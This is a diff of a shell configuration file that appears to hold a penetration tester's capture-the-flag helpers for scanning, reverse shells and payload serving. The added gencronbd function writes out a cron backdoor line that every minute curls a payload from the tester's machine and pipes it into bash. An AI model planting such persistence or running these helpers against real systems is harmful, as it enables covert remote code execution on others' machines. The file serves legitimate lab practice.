@@ -60,9 +60,9 @@ ctf_interface="tun0"
 
 rs() {
   if [[ "$1" != "" ]]; then
-    target_ip="$1"
+    tip="$1"
   fi
-  rustscan -b 2000 --ulimit 5000 -a "$target_ip" -- -A | tee rustscan.log
+  rustscan -b 2000 --ulimit 5000 -a "$tip" -- -A | tee rustscan.log
 }
 
 grip() {
@@ -80,16 +80,22 @@ cpip() {
 newctf() {
   target_name="$1"
   target_name_upper="$(tr '[:lower:]' '[:upper:]' <<< ${target_name:0:1})${target_name:1}"
-  target_ip="$2"
+  tip="$2"
   my_ip="$(getip)"
 
   mkdir "$target_name" && cd "$target_name"
-  echo "# $target_name_upper\n\nMy IP:         $my_ip\nTarget IP:     $target_ip\n\n" > notes.md
-  echo "$target_ip" > target_ip
+  echo "# $target_name_upper\n\nMy IP:         $my_ip\nTarget IP:     $tip\n\n" > notes.md
+  echo "$tip" > target_ip
 }
 
 sett() {
-  target_ip="$1"
+  tip="$1"
+  echo "$tip" > target_ip
+}
+
+gett() {
+  echo "$tip"
+  setclip "$tip"
 }
 
 genrev() {
@@ -111,17 +117,21 @@ revpayload() {
   python -m http.server
 }
 
+gencronbd() {
+  setclip "* * * * * /usr/bin/curl http://$(getip):8000/payload | /bin/bash"
+}
+
 alias gob="gobuster dir -w /usr/share/dirbuster/directory-list-2.3-medium.txt -o gobuster.log -u"
-alias gobt="gobuster dir -w /usr/share/dirbuster/directory-list-2.3-medium.txt -o gobuster.log -u http://$target_ip"
 alias ferb="feroxbuster -o feroxbuster.log -u"
-alias ferbt="feroxbuster -o feroxbuster.log -u https://$target_ip"
 alias nik="nikto -o '$(pwd)'/nikto_log.txt -h"
-alias nikt="nikto -o '$(pwd)'/nikto_log.txt -h http://$target_ip"
-alias pnt="ping $target_ip"
 alias up="python -m http.server"
 
+gobt() { gob "$tip" }
+ferbt() { ferb http://"$tip" }
+nikt() { nik "$tip" }
+
 if test -f target_ip; then
-  target_ip="$(cat target_ip)"
+  tip="$(cat target_ip)"
 fi
 
 # pfetch
